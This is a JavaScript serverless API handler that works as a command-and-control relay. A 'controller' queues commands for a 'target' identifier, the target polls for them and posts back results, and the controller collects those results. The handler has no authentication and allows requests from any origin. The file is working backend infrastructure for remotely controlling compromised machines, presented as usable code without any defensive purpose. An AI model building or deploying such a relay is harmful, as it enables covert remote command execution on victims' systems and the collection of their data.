let store = {
  commands: {},
  results: {}
};

export default function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const { targetId, action, cmdId } = req.query;
  const body = req.body || {};

  // Send command (Controller → Server)
  if (req.method === 'POST' && action === 'send') {
    const command = body.command;
    if (!targetId || !command) return res.status(400).json({ error: 'Missing data' });

    if (!store.commands[targetId]) store.commands[targetId] = [];
    const id = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
    store.commands[targetId].push({ id, command });
    return res.json({ status: 'queued', id });
  }

  // Poll command (Target → Server)
  if (req.method === 'GET' && action === 'poll') {
    if (!targetId) return res.status(400).json({ error: 'Missing targetId' });
    const commands = store.commands[targetId] || [];
    const command = commands.shift();
    return res.json(command ? { command: command.command, id: command.id } : { command: null });
  }

  // Send result (Target → Server)
  if (req.method === 'POST' && action === 'result') {
    const { id, result } = body;
    if (!targetId || !id) return res.status(400).json({ error: 'Missing data' });
    if (!store.results[targetId]) store.results[targetId] = [];
    store.results[targetId].push({ id, result });
    return res.json({ status: 'received' });
  }

  // Get result (Controller → Server)
  if (req.method === 'GET' && action === 'getResult') {
    if (!targetId || !cmdId) return res.status(400).json({ error: 'Missing data' });
    const results = store.results[targetId] || [];
    const idx = results.findIndex(r => r.id === cmdId);
    if (idx !== -1) {
      const result = results[idx].result;
      results.splice(idx, 1);
      return res.json({ result });
    }
    return res.json({ result: null });
  }

  return res.status(404).json({ error: 'Invalid route' });
}
